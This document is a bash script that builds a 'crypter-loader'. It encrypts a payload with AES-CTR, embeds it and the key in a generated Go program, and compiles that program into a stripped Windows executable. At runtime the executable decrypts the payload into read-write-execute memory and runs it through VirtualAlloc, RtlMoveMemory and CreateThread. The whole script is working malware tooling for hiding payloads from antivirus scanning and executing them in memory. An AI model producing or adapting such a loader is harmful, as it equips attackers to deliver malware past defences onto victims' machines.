#!/bin/bash
echo "🔧 Manual Crypter-Loader Builder"

# 1. Encrypt payload
echo "[1] Encrypting payload..."
python3 -c "
import sys, os, secrets
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# Read payload
with open('test_payload.exe', 'rb') as f:
    payload = f.read()

# Encrypt
key = secrets.token_bytes(32)
iv = secrets.token_bytes(16)
cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
encryptor = cipher.encryptor()
encrypted = encryptor.update(payload) + encryptor.finalize()

# Save encrypted
with open('payload.bin', 'wb') as f:
    f.write(iv + encrypted)

# Save key
key_hex = key.hex()
with open('key.txt', 'w') as f:
    f.write(key_hex)

print(f'Key: {key_hex[:16]}...')
print(f'Payload size: {len(payload):,} bytes')
print(f'Encrypted size: {len(encrypted)+16:,} bytes')
"

# 2. Create loader with embedded key
KEY=$(cat key.txt)
echo "[2] Creating loader with key: ${KEY:0:16}..."

cat > loader_final.go << EOF
package main

import (
	_ "embed"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"syscall"
	"unsafe"
)

//go:embed payload.bin
var encryptedData []byte

var keyHex = "$KEY"

func main() {
	key, _ := hex.DecodeString(keyHex)
	iv := encryptedData[:16]
	ciphertext := encryptedData[16:]
	
	block, _ := aes.NewCipher(key)
	stream := cipher.NewCTR(block, iv)
	decrypted := make([]byte, len(ciphertext))
	stream.XORKeyStream(decrypted, ciphertext)
	
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	createThread := kernel32.NewProc("CreateThread")
	
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(decrypted)), 0x3000, 0x40)
	rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&decrypted[0])), uintptr(len(decrypted)))
	createThread.Call(0, 0, addr, 0, 0, 0)
}
EOF

# 3. Compile
echo "[3] Compiling..."
GOOS=windows GOARCH=amd64 go build -o final_payload.exe -ldflags="-s -w" loader_final.go

# 4. Verify
echo "[4] Results:"
ls -lh test_payload.exe payload.bin final_payload.exe
echo -e "\n✅ Done! Copy final_payload.exe to Windows VM"
